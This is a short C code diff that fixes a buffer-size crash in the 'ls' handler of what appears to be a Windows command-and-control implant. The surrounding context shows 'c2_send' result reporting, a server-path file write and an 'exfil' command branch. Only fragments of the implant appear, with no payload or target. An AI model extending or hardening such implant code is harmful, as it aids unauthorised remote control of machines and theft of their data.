@@ -92,7 +92,7 @@ DWORD write(char* clientPath, char* serverPath) {
 
 
 // Write file + directory listing to out
-// TODO: segfaults on directories with lots of entries (ex: C:\Windows\System32)
+// Note: Can handle 50 kB of text before crash. This is arbitrary, can be increased.
 DWORD ls(char *path, char* out) {
     char preparedPath[MAX_PATH + 4];
     LARGE_INTEGER file_size;
@@ -469,7 +469,7 @@ int main() {
         }
 
         else if(strncmp(buffer, "ls", 2) == 0) {
-            char listing[4096] = {0};
+            char* listing = Malloc(50 * 1000); // 50 kB
             if (n == 2)
                 status = ls(PWD, listing);
             else if (n >= 4)
@@ -482,6 +482,7 @@ int main() {
             else {
                 c2_send("[!] Error", 9);
             }
+            Free(listing);
         }
 
         else if(strncmp(buffer, "exfil ", 6) == 0) {
